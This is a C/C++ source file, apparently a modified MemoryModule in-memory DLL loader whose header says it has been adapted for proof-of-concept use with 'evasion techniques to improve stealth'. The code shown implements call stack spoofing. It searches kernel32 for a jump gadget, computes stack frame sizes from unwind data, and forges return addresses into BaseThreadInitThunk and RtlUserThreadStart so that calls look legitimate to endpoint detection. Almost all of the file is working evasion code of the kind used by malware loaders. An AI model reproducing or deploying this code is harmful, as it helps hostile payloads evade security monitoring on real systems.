/*
 * Memory DLL loading code
 * Version 0.0.4
 *
 * Copyright (c) 2004-2015 by Joachim Bauch / mail@joachim-bauch.de
 * http://www.joachim-bauch.de
 *
 * The contents of this file are subject to the Mozilla Public License Version
 * 2.0 (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 * http://www.mozilla.org/MPL/
 *
 * Software distributed under the License is distributed on an "AS IS" basis,
 * WITHOUT WARRANTY OF ANY KIND, either express or implied. See the License
 * for the specific language governing rights and limitations under the
 * License.
 *
 * The Original Code is MemoryModule.c
 *
 * The Initial Developer of the Original Code is Joachim Bauch.
 *
 * Portions created by Joachim Bauch are Copyright (C) 2004-2015
 * Joachim Bauch. All Rights Reserved.
 *
 *
 * THeller: Added binary search in MemoryGetProcAddress function
 * (#define USE_BINARY_SEARCH to enable it).  This gives a very large
 * speedup for libraries that exports lots of functions.
 *
 * These portions are Copyright (C) 2013 Thomas Heller.
 *
 * Maxime de Caumia Baillenx.: Made the code position-independent (PIC), simplified it for
 * proof-of-concept usage, added command line support, and implemented
 * evasion techniques to improve stealth.
 *
 * These portions are Copyright (C) 2025 Maxime de Caumia Baillenx.
 */

#include <windows.h>
#include <winnt.h>
#include <stddef.h>
#include <tchar.h>
#include <intrin.h>


#ifdef DEBUG_OUTPUT
#include <stdio.h>
#endif


#ifndef IMAGE_SIZEOF_BASE_RELOCATION
 // Vista SDKs no longer define IMAGE_SIZEOF_BASE_RELOCATION!?
#define IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))
#endif


#ifdef _WIN64
#define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
#else
#define HOST_MACHINE IMAGE_FILE_MACHINE_I386
#endif





struct ExportNameEntry {
    LPCSTR name;
    WORD idx;
};


typedef BOOL(WINAPI* DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
typedef int (WINAPI* ExeEntryProc)(void);








//
// Credit to VulcanRaven & LoudSunRun projects
// Call stack spoofing functions
//

#include "Structs.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) == 0)
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)
#define RBP_OP_INFO 0x5

extern "C" PVOID NTAPI SpoofWithReturn(PVOID a, ...);


PVOID FindGadget(LPBYTE Module, ULONG Size, char* pattern)
{
    for (int x = 0; x < Size; x++)
    {
        if (memcmp(Module + x, pattern, 2) == 0)
        {
            return (PVOID)(Module + x);
        };
    };

    return NULL;
}


/* Credit to VulcanRaven project for the original implementation of these two*/
uintptr_t CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };


    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation)
        {
        case UWOP_PUSH_NONVOL:
            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame.totalStackSize += 8;
            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = 1;
                // Record when rbp is pushed to stack.
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            //UWOP_SAVE_NONVOL doesn't contribute to stack size
            // but you do need to increment index.
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            //Alloc size is op info field * 8 + 8.
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame.setsFramePointer = 1;
            break;
        default:
            // printf("[-] Error: Unsupported Unwind Op Code\n");
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    //
    // Not needed for PoC, but could be useful in the future.
    //
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        // printf(" !!!!!!! chained unwind information is present");
    }

    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
Cleanup:
    return status;
}


uintptr_t CalculateFunctionStackSizeWrapper( PVOID ReturnAddress)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    // [0] Sanity check return address.
    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        // printf("[!] STATUS_ASSERTION_FAILURE\n");
        goto Cleanup;
    }

    // [2] Recursively calculate the total stack size for
    // the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);

Cleanup:
    return status;
}

template<typename T>
void spoof(void* target_function,T value)
{
    PRM p = { 0 };
    char gadget_pattern[8] = {
    0xFF, 0x23, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
    };
    auto hkernel32 = GetModuleHandleA("kernel32.dll");
    p.trampoline = FindGadget(reinterpret_cast<BYTE*>(hkernel32), 0x200000, gadget_pattern);

    void* ReturnAddress = (BYTE*)(GetProcAddress(hkernel32, "BaseThreadInitThunk")) + 0x14; // Would walk export table but am lazy

    p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper(ReturnAddress);
    p.BTIT_retaddr = ReturnAddress;

    ReturnAddress = (PBYTE)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart")) + 0x21;
    p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper(ReturnAddress);
    p.RUTS_retaddr = ReturnAddress;
    p.Gadget_ss = (PVOID)CalculateFunctionStackSizeWrapper(p.trampoline);

    SpoofWithReturn((void*)value, NULL, NULL, NULL, &p, target_function, (PVOID)0);
}

void spoof(void* target_function)
{
    PRM p = { 0 };
    char gadget_pattern[8] = {
    0xFF, 0x23, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
    };
    auto hkernel32 = GetModuleHandleA("kernel32.dll");
    p.trampoline = FindGadget(reinterpret_cast<BYTE*>(hkernel32), 0x200000, gadget_pattern);

    void* ReturnAddress = (BYTE*)(GetProcAddress(hkernel32, "BaseThreadInitThunk")) + 0x14; // Would walk export table but am lazy

    p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper(ReturnAddress);
    p.BTIT_retaddr = ReturnAddress;

    ReturnAddress = (PBYTE)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart")) + 0x21;
    p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper(ReturnAddress);
    p.RUTS_retaddr = ReturnAddress;
    p.Gadget_ss = (PVOID)CalculateFunctionStackSizeWrapper(p.trampoline);

    SpoofWithReturn(0, NULL, NULL, NULL, &p, target_function, (PVOID)0);
}